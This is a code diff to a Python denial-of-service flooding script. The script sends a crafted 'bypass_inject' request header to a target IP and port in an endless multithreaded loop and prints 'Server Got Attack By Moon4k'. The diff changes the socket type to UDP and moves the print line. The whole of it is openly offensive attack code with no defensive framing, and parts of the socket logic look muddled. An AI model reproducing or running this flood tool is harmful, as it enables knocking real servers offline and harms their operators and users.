@@ -84,15 +84,15 @@ def start():
     bypass_inject = sockpeler + reffer + userAdmin + content + target_host + length + "\r\n"
     while True:
           try:
-             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+             s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
              s.connect((str(ip),int(port)))
              s.send(str.encode(bypass_inject))
              for pe in range(pack):
                  s.connect((str(ip),int(port)))
                  s.send(str.encode(bypass_inject))
-                 print("Server Got Attack By Moon4k:)")
+             print("Server Got Attack By Moon4k:)")
           except:
-              pass
+               pass
 for y in range(th):
     th = threading.Thread(target=start)
     th.start()
